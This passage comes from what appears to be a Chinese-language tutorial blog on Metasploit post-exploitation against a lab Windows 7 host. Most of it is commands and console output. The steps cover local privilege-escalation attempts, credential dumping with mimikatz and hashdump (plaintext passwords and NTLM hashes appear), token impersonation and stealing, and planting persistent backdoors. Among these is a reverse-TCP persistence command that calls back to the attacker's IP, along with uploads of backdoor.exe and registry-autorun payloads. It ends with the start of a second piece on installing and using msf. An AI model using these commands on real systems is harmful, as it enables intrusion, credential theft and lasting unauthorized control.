class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure><h3 id="4-6-获取凭证-4"><a href="#4-6-获取凭证-4" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>使用meterpreter的run hashdump命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-假冒令牌-4"><a href="#4-7-假冒令牌-4" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><h3 id="4-8-植入后门-4"><a href="#4-8-植入后门-4" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul>尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msf基本命令-5"><a href="#2-msf基本命令-5" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 